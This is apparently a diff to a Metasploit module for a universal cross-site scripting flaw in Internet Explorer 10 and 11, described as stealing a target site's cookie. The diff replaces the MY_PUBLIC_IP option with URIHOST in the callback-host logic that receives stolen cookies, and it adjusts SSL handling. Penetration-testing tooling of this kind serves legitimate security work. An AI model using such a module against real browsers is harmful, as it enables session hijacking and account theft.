@@ -15,9 +15,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
           This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet
           Explorer 10 and 11. It will steal the cookie of a specific webiste (set by the TARGET_URI
-          datastore option). You will also most likely need to configure the MY_PUBLIC_IP
-          datastore option in order receive the cookie. If you and the victim are actually in the
-          same internal network, then you don't need to touch MY_PUBLIC_IP.
+          datastore option). You will also most likely need to configure the URIHOST if you are behind NAT.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -38,8 +36,7 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
     [
-      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
-      OptString.new('MY_PUBLIC_IP', [ false, 'The exploit\'s public facing IP (Default: Internal IP)']),
+      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ])
     ], self.class)
   end
 
@@ -64,12 +61,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_uri(cli=self.cli)
-    ssl = !!(datastore["SSL"])
+    ssl = datastore["SSL"]
     proto = (ssl ? "https://" : "http://")
     if datastore['URIHOST']
       host = datastore['URIHOST']
-    elsif datastore['MY_PUBLIC_IP']
-      host = datastore['MY_PUBLIC_IP']
     elsif (cli and cli.peerhost)
       host = Rex::Socket.source_address(cli.peerhost)
     else
